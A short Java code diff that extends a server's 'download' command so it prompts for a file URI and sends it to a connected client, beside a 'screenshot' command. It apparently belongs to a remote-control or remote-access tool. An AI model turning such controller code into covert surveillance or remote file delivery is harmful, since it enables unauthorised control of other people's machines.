@@ -157,7 +157,15 @@ public class Server implements Runnable {
                     
                 }
                 if (command.equals("download")) {
-                    System.out.println("file download initiated");
+                    System.out.println("file download module initiated");
+                    System.out.print("enter complete URI of file to download");
+                    String loc = Keyboard.readString();
+                    ps.println("dl");
+                    String check = din.readLine();
+                    if (!check.equals("ok")) {
+                        System.out.println("Communication out of sync error");
+                    }
+                    ps.println(loc);
                     
                 }
                 if (command.equals("screenshot")) {
